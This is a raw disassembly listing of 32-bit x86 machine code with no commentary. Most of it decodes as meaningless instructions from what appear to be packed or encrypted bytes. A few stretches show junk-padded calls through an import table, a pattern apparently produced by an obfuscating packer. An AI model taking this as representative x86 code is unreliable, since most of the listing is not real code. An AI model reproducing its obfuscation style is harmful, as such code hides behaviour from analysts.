  418be3:	mov    ebp,0x6f447932
  418be8:	aam    0xaf
  418bea:	data16 add BYTE PTR [eax+ebx*8+0x5a158850],dl
  418bf2:	(bad)  [edx]
  418bf4:	cmp    dl,bl
  418bf6:	add    eax,0xb0fe5816
  418bfb:	cmp    ebp,DWORD PTR [edx]
  418bfd:	mov    esp,0xceeff87a
  418c02:	fbld   TBYTE PTR [esi+0x378704a3]
  418c08:	push   ecx
  418c09:	call   0x5464ace8
  418c0e:	mov    dl,0xd7
  418c10:	call   0x5d7288a3
  418c15:	push   ecx
  418c16:	and    ch,BYTE PTR ds:0x185e5380
  418c1c:	mov    ah,0xc6
  418c1e:	sub    BYTE PTR [edi],dh
  418c20:	or     eax,0xb837b8b5
  418c25:	dec    edi
  418c26:	xchg   al,bh
  418c28:	daa    
  418c29:	and    DWORD PTR [ebp-0x54590d23],ebx
  418c2f:	add    BYTE PTR [esi+ebx*1],bl
  418c32:	cli    
  418c33:	or     DWORD PTR [ebx+0x0],eax
  418c36:	cmp    eax,0xa08eeeb1
  418c3b:	(bad)  
  418c3c:	(bad)  
  418c3d:	mov    dh,0xcc
  418c3f:	ins    BYTE PTR es:[edi],dx
  418c40:	loope  0x418c68
  418c42:	push   ecx
  418c43:	js     0x418c44
  418c45:	xor    DWORD PTR [ebx-0x2a1993c6],esi
  418c4b:	pop    ds
  418c4c:	sub    ecx,ebp
  418c4e:	daa    
  418c4f:	sbb    cl,BYTE PTR [esi+0x13d2d756]
  418c55:	in     al,dx
  418c56:	fadd   QWORD PTR [esi]
  418c58:	into   
  418c59:	add    eax,0x3194cb85
  418c5e:	mov    al,0x22
  418c60:	in     eax,0xef
  418c62:	adc    bh,BYTE PTR [edi+0x57f68022]
  418c68:	stos   DWORD PTR es:[edi],eax
  418c69:	ins    DWORD PTR es:[edi],dx
  418c6a:	jmp    0x7f76:0xc437baa7
  418c71:	dec    esp
  418c72:	stc    
  418c73:	pop    esi
  418c74:	add    eax,0x5b8c19a5
  418c79:	std    
  418c7a:	ins    DWORD PTR es:[edi],dx
  418c7b:	test   BYTE PTR [edi-0x64b5e1fe],al
  418c81:	call   DWORD PTR [ebx-0x13401a83]
  418c87:	jle    0x418cca
  418c89:	or     DWORD PTR [edx],edx
  418c8b:	loopne 0x418ccf
  418c8d:	xchg   esi,eax
  418c8e:	(bad)  
  418c8f:	out    0xd5,al
  418c91:	in     al,0xf
  418c93:	loopne 0x418cf3
  418c95:	enter  0x6682,0x97
  418c99:	ss ror ch,cl
  418c9c:	or     DWORD PTR [eax-0x12579869],edi
  418ca2:	lods   al,BYTE PTR ds:[esi]
  418ca3:	adc    DWORD PTR [ebx-0x61],esp
  418ca6:	jp     0x418d15
  418ca8:	test   DWORD PTR [ebp+0x41],ecx
  418cab:	push   0x56
  418cad:	ret    
  418cae:	fld    QWORD PTR [esi+edx*2-0x7120b5c8]
  418cb5:	outs   dx,BYTE PTR ds:[esi]
  418cb6:	mov    dh,0x9
  418cb8:	mul    ebp
  418cba:	dec    eax
  418cbb:	js     0x418cc5
  418cbd:	or     BYTE PTR [edi-0x50],dl
  418cc0:	das    
  418cc1:	imul   ebp,DWORD PTR [edi-0x50],0x1ac2ec34
  418cc8:	test   ecx,ebx
  418cca:	jo     0x418d03
  418ccc:	in     al,0x4c
  418cce:	std    
  418ccf:	push   ebx
  418cd0:	rcl    DWORD PTR [edx+0x1cce889b],0xbc
  418cd7:	push   0xffffffe1
  418cd9:	sub    al,0x2e
  418cdb:	ret    0x5502
  418cde:	ror    DWORD PTR [esi+0x5c],cl
  418ce1:	dec    ebx
  418ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ce3:	mov    esi,0x180a710f
  418ce8:	into   
  418ce9:	lds    edx,FWORD PTR ds:0xcc6c24d2
  418cef:	push   ebx
  418cf0:	xchg   edi,eax
  418cf1:	and    edx,DWORD PTR [edx]
  418cf3:	inc    edi
  418cf4:	xchg   ax,ax
  418cf6:	add    BYTE PTR [ecx],dh
  418cf8:	and    ebx,DWORD PTR ds:0xd6792b7
  418cfe:	add    DWORD PTR [ecx+0x10],esi
  418d01:	xadd   eax,ebx
  418d04:	shl    DWORD PTR [ecx],0x7
  418d07:	xchg   esi,eax
  418d08:	or     eax,0x6049ecc1
  418d0d:	mov    edx,0xc11c593d
  418d12:	test   eax,0xe909652e
  418d17:	pop    edi
  418d18:	pop    ds
  418d19:	lahf   
  418d1a:	pop    ds
  418d1b:	clc    
  418d1c:	in     al,0x29
  418d1e:	gs pop edi
  418d20:	fcomp  DWORD PTR [ebp+0x7cd1b828]
  418d26:	jne    0x418ce1
  418d28:	dec    ebp
  418d29:	jne    0x418d4c
  418d2b:	test   edx,ecx
  418d2d:	mov    ds:0x38112755,eax
  418d32:	xchg   ebp,eax
  418d33:	jb     0x418d51
  418d35:	inc    edi
  418d36:	out    0x58,al
  418d38:	ins    DWORD PTR es:[edi],dx
  418d39:	mov    eax,0xfa5befa0
  418d3f:	mov    bh,0x14
  418d41:	sbb    BYTE PTR [ebp+ebp*1+0x45cbbf01],ch
  418d48:	mov    bl,0xdb
  418d4a:	cmp    eax,0x53747c1a
  418d4f:	jp     0x418d35
  418d51:	xor    DWORD PTR [ebx+ebp*2],ebx
  418d54:	not    eax
  418d56:	xor    cl,BYTE PTR [eax-0x5f51c42d]
  418d5c:	iret   
  418d5d:	sub    al,0x4
  418d5f:	push   ebx
  418d60:	push   ecx
  418d61:	cmp    dl,0xfe
  418d64:	mov    ah,0x38
  418d66:	xor    al,0xcf
  418d68:	out    0xb5,eax
  418d6a:	dec    edx
  418d6b:	dec    ebp
  418d6c:	arpl   WORD PTR [ebx+0x74],si
  418d6f:	into   
  418d70:	xchg   ecx,eax
  418d71:	loop   0x418d82
  418d73:	pop    edi
  418d74:	vsubsd xmm4,xmm4,QWORD PTR [edx+0x4b]
  418d79:	das    
  418d7a:	mov    ch,0xf7
  418d7c:	pop    es
  418d7d:	aaa    
  418d7e:	and    ecx,DWORD PTR [edx+0x1f]
  418d81:	mov    DWORD PTR ds:0x396e517b,ebx
  418d87:	pop    ss
  418d88:	pop    ecx
  418d89:	or     BYTE PTR [edi+0x23],al
  418d8c:	into   
  418d8d:	mov    esi,0x54cd0193
  418d92:	xchg   ah,bh
  418d94:	fmul   QWORD PTR [edi]
  418d96:	and    ch,bh
  418d98:	cmp    al,0x75
  418d9a:	jmp    0x79bc:0xb4418e07
  418da1:	aad    0xbb
  418da3:	test   al,0xe9
  418da5:	clc    
  418da6:	ja     0x418d35
  418da8:	mov    ecx,0x9956f0d2
  418dad:	scas   eax,DWORD PTR es:[edi]
  418dae:	xor    al,0x4b
  418db0:	cmp    eax,0x13ded1e3
  418db5:	mov    eax,0x14d09d02
  418dba:	mov    dl,0xb0
  418dbc:	ins    DWORD PTR es:[edi],dx
  418dbd:	scas   eax,DWORD PTR es:[edi]
  418dbe:	ret    
  418dbf:	mov    ?,WORD PTR [ecx]
  418dc1:	jle    0x418e0e
  418dc3:	dec    esi
  418dc4:	(bad)  
  418dc5:	(bad)  
  418dc7:	and    BYTE PTR [ecx],dh
  418dc9:	and    BYTE PTR [ebp-0x5e5b7a68],cl
  418dcf:	dec    ebp
  418dd0:	rcr    DWORD PTR [edx+0x66],0x56
  418dd4:	pop    esp
  418dd5:	imul   ecx,DWORD PTR [ebx+0x3cf2259a],0xffffffb5
  418ddc:	sbb    al,al
  418dde:	das    
  418ddf:	fs call 0xcfb7:0x6bf0d562
  418de7:	test   al,0x89
  418de9:	test   bh,dl
  418deb:	dec    eax
  418dec:	push   cs
  418ded:	cwde   
  418dee:	int3   
  418def:	pop    ebx
  418df0:	hlt    
  418df1:	in     al,0x7e
  418df3:	(bad)  
  418df4:	dec    esp
  418df5:	arpl   WORD PTR ds:0x593d4527,ax
  418dfb:	push   ebp
  418dfc:	scas   eax,DWORD PTR es:[edi]
  418dfd:	add    DWORD PTR [esi-0x5723bd94],edx
  418e03:	cmp    eax,0x5ac6d6da
  418e08:	mov    bl,0x10
  418e0a:	and    ah,ch
  418e0c:	or     eax,ebp
  418e0e:	in     al,dx
  418e0f:	das    
  418e10:	mov    ebx,0x1d86c84e
  418e15:	inc    esi
  418e16:	pop    edi
  418e17:	clc    
  418e18:	aas    
  418e19:	dec    esi
  418e1a:	jbe    0x418e1b
  418e1c:	push   esp
  418e1d:	ins    DWORD PTR es:[edi],dx
  418e1e:	loopne 0x418e28
  418e20:	inc    ecx
  418e21:	pop    ebp
  418e22:	inc    ebp
  418e23:	jae    0x418df6
  418e25:	push   0x28
  418e27:	cmp    DWORD PTR [ebp+0x5451db9f],ebp
  418e2d:	and    esp,DWORD PTR [ecx]
  418e2f:	push   ds
  418e30:	call   0xc82b:0xc6b82a3d
  418e37:	push   0xffffffeb
  418e39:	add    eax,DWORD PTR [ebp-0x66abe688]
  418e3f:	(bad)  
  418e40:	mov    ecx,0x730f2054
  418e45:	xchg   DWORD PTR [ebx-0x31],edx
  418e48:	push   edx
  418e49:	inc    ecx
  418e4a:	shr    DWORD PTR [esi+0x38],cl
  418e4d:	test   BYTE PTR [ecx-0x6db864c],0x51
  418e54:	pcmpgtb mm4,QWORD PTR [eax+eax*4+0x69]
  418e59:	sub    al,0x9
  418e5b:	cld    
  418e5c:	ret    
  418e5d:	fbstp  TBYTE PTR [ebx-0x2b]
  418e60:	or     BYTE PTR [edx-0x53604cea],dl
  418e66:	aad    0x25
  418e68:	sbb    DWORD PTR [esi+esi*4+0x44],ebp
  418e6c:	dec    ecx
  418e6d:	pusha  
  418e6e:	and    edi,DWORD PTR [ebx-0x43]
  418e71:	mov    cl,0xe5
  418e73:	xor    al,0x60
  418e75:	mov    ds:0x27683d8a,eax
  418e7a:	push   edx
  418e7b:	jo     0x418e21
  418e7d:	dec    ebp
  418e7e:	dec    esp
  418e7f:	push   eax
  418e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e81:	mov    eax,DWORD PTR [edx-0x6c]
  418e84:	jmp    0x418e65
  418e86:	and    eax,0x47c43716
  418e8b:	mov    WORD PTR [ecx+0x2fca1d2e],cs
  418e91:	sti    
  418e92:	mov    ebp,DWORD PTR [ebx]
  418e94:	push   ecx
  418e95:	adc    al,0x60
  418e97:	loope  0x418ed8
  418e99:	out    0x78,eax
  418e9b:	jmp    0x31dc22e0
  418ea0:	mov    dl,0x78
  418ea2:	in     al,dx
  418ea3:	retf   0x8c1
  418ea6:	arpl   WORD PTR [esi-0x79],di
  418ea9:	lds    esi,FWORD PTR [edi+eax*8-0x54]
  418ead:	mov    bl,0x3d
  418eaf:	repz mov eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x4283ef,0x0
  418ec3:	mov    DWORD PTR ds:0x4281b7,0x216c
  418ecd:	mov    DWORD PTR ds:0x4282bb,0x28e7
  418ed7:	mov    DWORD PTR ds:0x4282b3,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x4282c3,0x562c
  418ef0:	mov    DWORD PTR ds:0x4282eb,0x3af5
  418efa:	cmp    DWORD PTR ds:0x4283ef,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428377
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428e44
  418f1a:	not    DWORD PTR ds:0x4281eb
  418f20:	sub    DWORD PTR ds:0x4283df,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x4281a3
  418f32:	mov    edx,DWORD PTR ds:0x4282e7
  418f38:	sbb    DWORD PTR ds:0x4283cb,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428323
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42835b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x4283df,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283f3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x42834b,0x0
  418f6c:	not    DWORD PTR ds:0x4282b7
  418f72:	not    DWORD PTR ds:0x4281e7
  418f78:	mov    DWORD PTR ds:0x42833f,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42836f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x42834b,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x4283cb
  418fb5:	call   DWORD PTR ds:0x428e48
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42827f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x4281df
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x4283cf,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x4281db,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x4281bf,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x4281af,0x0
  41900e:	mov    DWORD PTR ds:0x4281c3,0x4347
  419018:	mov    DWORD PTR ds:0x4281e7,0x6064
  419022:	mov    DWORD PTR ds:0x4282cf,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x4282a3,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x4281af,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428e4c
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x42833f
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42827b
  41906c:	or     DWORD PTR ds:0x4283bf,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x748f3402]
  419095:	ja     0x4190be
  419097:	stos   BYTE PTR es:[edi],al
  419098:	aas    
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1+0x62b81818],bh
  4190a2:	push   edx
  4190a3:	daa    
  4190a4:	lods   al,BYTE PTR ds:[esi]
  4190a5:	mov    WORD PTR [ebp+0x1550821c],?
  4190ab:	stos   BYTE PTR es:[edi],al
  4190ac:	pop    esi
  4190ad:	pop    es
  4190ae:	fsubr  DWORD PTR [ecx+0x4e07e15c]
  4190b4:	push   ds
  4190b5:	lods   al,BYTE PTR ds:[esi]
  4190b6:	fwait
  4190b7:	aaa    
  4190b8:	or     DWORD PTR [eax+0x7c7f378f],edi
  4190be:	jl     0x41907a
  4190c0:	add    al,0x51
  4190c2:	or     esp,DWORD PTR [edi+ecx*8]
  4190c5:	jnp    0x41909a
  4190c7:	cs jge 0x419123
  4190ca:	jge    0x419141
  4190cc:	cld    
  4190cd:	cmp    eax,0x9fc2ea1f
  4190d2:	dec    eax
  4190d3:	xchg   BYTE PTR [ecx+0xa339e9b],dh
  4190d9:	lods   eax,DWORD PTR ds:[esi]
  4190da:	sub    al,0xff
  4190dc:	fadd   st,st(6)
  4190de:	in     al,dx
  4190df:	mov    ebx,DWORD PTR [ebx]
  4190e1:	stc    
  4190e2:	jno    0x41910a
  4190e4:	mov    dl,0xd9
  4190e6:	mov    ebp,0x1c020e29
  4190eb:	adc    DWORD PTR [esi-0x12],edx
  4190ee:	pop    es
  4190ef:	(bad)  
  4190f0:	lods   eax,DWORD PTR ds:[esi]
  4190f1:	inc    eax
  4190f2:	adc    esi,edi
  4190f4:	pop    edx
  4190f5:	pop    ebx
  4190f6:	pop    ebx
  4190f7:	pusha  
  4190f8:	xchg   ebx,eax
  4190f9:	les    esp,FWORD PTR [edx+esi*1+0x457b5dea]
  419100:	cmp    esi,edi
  419102:	xchg   DWORD PTR [esi-0x158c10ed],edx
  419108:	cmp    edx,DWORD PTR [eax-0x5486be3d]
  41910e:	jno    0x4190de
  419110:	loop   0x4190ff
  419112:	mov    esi,0x66b3b061
  419117:	aam    0xa4
  419119:	dec    eax
  41911a:	retf   0x629c
  41911d:	or     edx,esi
  41911f:	mov    ah,0x84
  419121:	dec    esi
  419122:	push   0xfffffff7
  419124:	daa    
  419125:	sub    eax,0x1f38ff2c
  41912a:	in     eax,0x57
  41912c:	xor    eax,0x5fe5e24f
  419131:	daa    
  419132:	lock (bad) 
  419134:	or     ebx,ebx
  419136:	jl     0x4190c5
  419138:	std    
  419139:	pop    eax
  41913a:	adc    al,0xf0
  41913c:	xor    cl,bl
  41913e:	pop    edi
  41913f:	fiadd  DWORD PTR [ebx+0x27]
  419142:	lds    ebx,FWORD PTR [edx+0x65]
  419145:	xor    edi,DWORD PTR [ebx+0x3b]
  419148:	aam    0x62
  41914a:	scas   al,BYTE PTR es:[edi]
  41914b:	cdq    
  41914c:	ucomiss xmm7,xmm1
  41914f:	mov    al,0x7e
  419152:	jle    0x4191ce
  419154:	mov    ds,ecx
  419156:	lods   eax,DWORD PTR ds:[esi]
  419157:	mov    al,ds:0xd351877f
  41915c:	cmp    DWORD PTR [esp+ecx*8+0x3915b8f],0xffffffe2
  419164:	test   BYTE PTR [esi-0x74],cl
  419167:	dec    edx
  419168:	loope  0x4191d1
  41916a:	jnp    0x4191e0
  41916c:	pop    ss
  41916d:	jo     0x41915e
  41916f:	sub    DWORD PTR [ebx+0xb],0x60
  419173:	repnz nop
  419175:	rcr    al,cl
  419177:	dec    edi
  419178:	in     eax,0x1a
  41917a:	sub    edx,DWORD PTR [esi+0x2f]
  41917d:	push   eax
  41917e:	dec    edi
  41917f:	xchg   DWORD PTR [eax],edi
  419181:	retf   0xd6c9
  419184:	(bad)  
  419185:	nop
  419186:	test   al,0x32
  419188:	arpl   WORD PTR [ebx],ax
  41918a:	push   ds
  41918b:	(bad)  
  41918c:	mov    ebx,fs
  41918e:	or     BYTE PTR [edx],al
  419190:	xor    eax,eax
  419192:	pop    esp
  419193:	fsubr  QWORD PTR [edx]
  419195:	mov    dl,0x48
  419197:	iret   
  419198:	imul   esp,DWORD PTR [esi-0x4e],0xb9fb504b
  41919f:	and    edi,ebp
  4191a1:	mov    ah,0x88
  4191a3:	sar    dl,1
  4191a5:	call   0x4e76:0x1cb0ef5c
  4191ac:	test   eax,0xe0cab758
  4191b1:	imul   edi,DWORD PTR [ecx],0xffffffe4
  4191b4:	xor    dh,al
  4191b6:	mov    esp,DWORD PTR [eax]
  4191b8:	push   ecx
  4191b9:	dec    edx
  4191ba:	imul   edi,DWORD PTR [ebp-0x2dbcdcf1],0xb9c29333
  4191c4:	std    
  4191c5:	jnp    0x419236
  4191c7:	imul   ecx,DWORD PTR [ecx],0xb66aff7f
  4191cd:	inc    esi
  4191ce:	adc    al,BYTE PTR [edx-0x44401a5f]
  4191d4:	in     al,0xf0
  4191d6:	popa   
  4191d7:	imul   ebx,DWORD PTR [esi],0x54
  4191da:	push   ebp
  4191db:	push   esp
  4191dc:	mov    esp,DWORD PTR [ebx-0x40c233c0]
  4191e2:	adc    al,0x88
  4191e4:	out    dx,eax
  4191e5:	cmp    ah,BYTE PTR [edx+0x2bb70d]
  4191eb:	jp     0x419234
  4191ed:	jmp    0x5357:0x4023aee4
  4191f4:	dec    esp
  4191f5:	ret    0xdf9
  4191f8:	addr16 in al,dx
  4191fa:	xchg   esp,eax
  4191fb:	add    esp,ebp
  4191fd:	bound  ebp,QWORD PTR [ebx+edx*4+0x2fef509f]
  419204:	fimul  WORD PTR [esi-0x1a7e6e22]
  41920a:	push   ebx
  41920b:	jecxz  0x4191d4
  41920d:	stc    
  41920e:	dec    edi
  41920f:	xchg   ecx,eax
  419210:	inc    esi
  419211:	call   0x97dd:0x933028ca
  419218:	leave  
  419219:	inc    edi
  41921a:	mul    DWORD PTR [ebp+ebx*4-0x6e0e3f05]
  419221:	shl    BYTE PTR [edi+0x4d],1
  419224:	cmp    edi,DWORD PTR [edx]
  419226:	fiadd  WORD PTR [eax]
  419228:	repz and ah,cl
  41922b:	fnstenv [ebp+0x3a66a6db]
  419231:	pop    eax
  419232:	xor    dl,dh
  419234:	push   ecx
  419235:	jmp    0x8dcc5fef
  41923a:	scas   eax,DWORD PTR es:[edi]
  41923b:	xchg   ebx,eax
  41923c:	xlat   BYTE PTR ds:[ebx]
  41923d:	pop    ebx
  41923e:	dec    ebx
  41923f:	sub    DWORD PTR [ebx+0x22],0x4f3499b4
  419246:	fdiv   st,st(5)
  419248:	add    eax,0x40bc670c
  41924d:	pop    ecx
  41924e:	adc    edi,ecx
  419250:	les    esp,FWORD PTR [edx]
  419252:	mov    edx,0xb5db3d43
  419257:	or     eax,0xa78c6f5a
  41925c:	sbb    BYTE PTR ds:0xca1492b4,bl
  419262:	dec    ecx
  419263:	cld    
  419264:	(bad)  
  419265:	dec    DWORD PTR [ebx+ecx*4]
  419268:	inc    ebx
  419269:	jno    0x41920c
  41926b:	mov    ebx,0xbb163f12
  419270:	outs   dx,DWORD PTR ds:[esi]
  419271:	cwde   
  419272:	in     al,0x70
  419274:	inc    esi
  419275:	(bad)  [ecx]
  419277:	fwait
  419278:	les    ebx,FWORD PTR ds:0x176f5b2b
  41927e:	jp     0x419205
  419280:	or     al,0x6
  419282:	lock adc ah,bl
  419285:	scas   al,BYTE PTR es:[edi]
  419286:	sbb    eax,0x6c87003
  41928b:	mov    ebp,0xdae4fbd2
  419290:	xchg   ebx,eax
  419291:	scas   al,BYTE PTR es:[edi]
  419292:	push   ebx
  419293:	mov    eax,0xf71b888a
  419298:	cmp    eax,0x71db05c3
  41929d:	leave  
  41929e:	and    al,0x44
  4192a0:	sub    eax,0xda9ac510
  4192a5:	dec    ebp
  4192a6:	ins    BYTE PTR es:[edi],dx
  4192a7:	cdq    
  4192a8:	div    BYTE PTR [ebx]
  4192aa:	aad    0x6d
  4192ac:	mov    WORD PTR [esi-0x6fc732c],fs
  4192b2:	or     eax,0xd311ec4
  4192b7:	mov    bl,0xec
  4192b9:	xchg   ebx,eax
  4192ba:	mov    ebx,0xa3563d
  4192bf:	mov    bl,0x82
  4192c1:	mov    bh,0xbf
  4192c3:	clc    
  4192c4:	sub    BYTE PTR [eax],bh
  4192c6:	add    ebp,eax
  4192c8:	push   esp
  4192c9:	cmc    
  4192ca:	mov    ss,WORD PTR ds:0xfb96625d
  4192d0:	cmp    eax,0xb338a286
  4192d5:	sub    ah,BYTE PTR [esi]
  4192d7:	jl     0x4192f0
  4192d9:	in     eax,dx
  4192da:	cmp    cl,ch
  4192dc:	jecxz  0x41933f
  4192de:	sbb    DWORD PTR [edi+0x7a],edx
  4192e1:	mov    ch,0x1c
  4192e3:	outs   dx,BYTE PTR ds:[esi]
  4192e4:	xchg   edi,eax
  4192e5:	mov    cl,0xee
  4192e7:	and    ecx,0xffffff9b
  4192ea:	outs   dx,BYTE PTR ds:[esi]
  4192eb:	sbb    al,0xdd
  4192ed:	add    DWORD PTR fs:[esi],ecx
  4192f0:	out    dx,al
  4192f1:	cs jecxz 0x4192e9
  4192f4:	js     0x4192df
  4192f6:	cmp    al,0xc0
  4192f8:	daa    
  4192f9:	stc    
  4192fa:	adc    BYTE PTR [ebp+0x3a],0xba
  4192fe:	ret    
  4192ff:	jno    0x419351
  419301:	das    
  419302:	push   esi
  419303:	stos   BYTE PTR es:[edi],al
  419304:	jne    0x4192bb
  419306:	xchg   DWORD PTR [ebx+ebx*8+0xa58ab9d],edi
  41930d:	fs popf 
  41930f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419310:	inc    esi
  419311:	scas   eax,DWORD PTR es:[edi]
  419312:	mov    ebx,0x94146a85
  419317:	imul   ebx,DWORD PTR ds:0x98a96260,0x89984eda
  419321:	leave  
  419322:	jecxz  0x41937b
  419324:	jmp    0x911bcee8
  419329:	inc    edi
  41932a:	fdivr  st(6),st
  41932c:	jp     0x4192f1
  41932e:	mov    al,ds:0x1cbdae13
  419333:	test   eax,0x809f2bad
  419338:	add    DWORD PTR [esi-0x7a15ed5c],0xffffffe6
  41933f:	pop    es
  419340:	jo     0x419387
  419342:	add    BYTE PTR [esi],al
  419344:	cs inc ecx
  419346:	mov    dh,0xd6
  419348:	and    cl,BYTE PTR [ebx+0x6b]
  41934b:	out    dx,eax
  41934c:	pop    edi
  41934d:	popa   
  41934e:	sub    DWORD PTR [ecx+eiz*8-0x789a0805],esi
  419355:	mov    ebp,0x71710d0c
  41935a:	push   esi
  41935b:	mov    ch,0xf
  41935d:	test   DWORD PTR [edx+0x4d],esp
  419360:	push   eax
  419361:	jmp    FWORD PTR gs:[edx-0x5a763d7d]
  419368:	dec    edx
  419369:	(bad)  
  41936a:	pop    edx
  41936b:	cmp    eax,0x7fbf206e
  419370:	push   ss
  419371:	enter  0xa09,0x9a
  419375:	jge    0x419316
  419377:	in     eax,dx
  419378:	mov    es,ebp
  41937a:	mov    ds:0x6a967cc5,al
  41937f:	scas   eax,DWORD PTR es:[edi]
  419380:	daa    
  419381:	sub    dh,BYTE PTR [eax+0x1a8090aa]
  419387:	scas   al,BYTE PTR es:[edi]
  419388:	inc    esp
  419389:	cmp    eax,0x1afe1075
  41938e:	nop
  41938f:	sub    eax,eax
  419391:	mov    al,0xce
  419393:	rcl    al,0x14
  419396:	sbb    BYTE PTR [ebx+0x72],bl
  419399:	ret    0x19f
  41939c:	in     eax,dx
  41939d:	mov    esi,eax
  41939f:	push   ss
  4193a0:	dec    ecx
  4193a1:	in     eax,dx
  4193a2:	xor    DWORD PTR [ebp+0xd],edi
  4193a5:	call   0xd5a8:0xafe3099a
  4193ac:	push   edi
  4193ad:	jmp    0x4193f4
  4193af:	push   ebp
  4193b0:	jmp    0x56f71fd0
  4193b5:	leave  
  4193b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193b7:	xor    BYTE PTR [esi+ecx*4-0x79ba080f],0xcc
  4193bf:	hlt    
  4193c0:	or     dh,dh
  4193c2:	fcomp  st(5)
  4193c4:	lahf   
  4193c5:	mov    ah,0x72
  4193c7:	mov    edx,0xc6f41ea6
  4193cc:	shl    BYTE PTR [ecx+0x74128612],cl
  4193d2:	aad    0x35
  4193d4:	rol    ebx,0xd3
  4193d7:	ds test dl,al
  4193da:	pop    ds
  4193db:	cmp    al,0xd7
  4193dd:	call   0x4ebd:0xaa32265b
  4193e4:	mov    ds:0x7742a003,al
  4193e9:	or     al,0x70
  4193eb:	daa    
  4193ec:	dec    eax
  4193ed:	mov    eax,ds:0x64469584
  4193f2:	sahf   
  4193f3:	pop    esi
  4193f4:	loope  0x419425
  4193f6:	add    al,cl
  4193f8:	or     DWORD PTR [eax],eax
  4193fa:	ja     0x419430
  4193fc:	jle    0x4193f9
  4193fe:	push   edi
  4193ff:	mov    ebp,0x3dc60890
  419404:	sbb    bl,dl
  419406:	repnz lods al,BYTE PTR ds:[esi]
  419408:	push   edi
  419409:	cmc    
  41940a:	stos   DWORD PTR es:[edi],eax
  41940b:	call   0x33ca:0x8afbdff6
  419412:	push   ss
  419413:	ficomp WORD PTR [esi-0x75]
  419416:	shl    BYTE PTR [esi],1
  419418:	cs (bad) 
  41941a:	idiv   DWORD PTR [edx-0x31]
  41941d:	mov    bh,0x91
  41941f:	mov    ?,WORD PTR [esi-0x69]
  419422:	and    bl,dh
  419424:	repz jmp 0xd91e:0xf6074966
  41942c:	aas    
  41942d:	sahf   
  41942e:	push   eax
  41942f:	fnstenv [esi+eiz*2]
  419432:	and    ah,bl
  419434:	imul   esp,DWORD PTR [ebx],0xffffffb8
  419437:	ret    
  419438:	inc    edi
  419439:	mov    esp,0xb03d8fdd
  41943e:	add    eax,0x4e9576a7
  419443:	lods   eax,DWORD PTR ds:[esi]
  419444:	js     0x4193ea
  419446:	add    BYTE PTR [eax+0x343f7555],bl
  41944c:	shl    dl,1
  41944e:	adc    esi,DWORD PTR ds:0x8c8b57ac
  419454:	and    al,0x84
  419456:	add    BYTE PTR [eax],al
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	pop    DWORD PTR [edx-0x76ffffbe]
  419465:	sbb    eax,0x4283e7
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283f3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42828f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e50
  41949a:	mov    DWORD PTR ds:0x4282cb,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x428333
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42836b,edx
  4194b2:	mov    DWORD PTR ds:0x4282f3,0x52b1
  4194bc:	or     DWORD PTR ds:0x4281cb,edx
  4194c2:	and    DWORD PTR ds:0x4283cf,ecx
  4194c8:	cmp    DWORD PTR ds:0x428377,0x0
